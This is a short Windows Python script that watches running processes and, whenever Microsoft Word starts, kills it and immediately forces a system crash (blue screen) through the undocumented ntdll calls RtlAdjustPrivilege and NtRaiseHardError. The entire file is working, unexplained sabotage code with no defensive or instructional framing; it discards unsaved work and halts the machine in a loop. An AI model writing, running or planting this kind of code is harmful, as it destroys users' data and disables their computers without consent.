import psutil
import time

from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

def bsod():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )


if __name__ == "__main__":
    while True:
        for p in psutil.process_iter(attrs=["cmdline"]):
            try:
                if p.info["cmdline"] and "WINWORD.EXE" in p.info["cmdline"][0]:
                    p.kill()
                    bsod()
            except (psutil.NoSuchProcess, psutil.AccessDenied, IndexError):
                pass
        time.sleep(3)
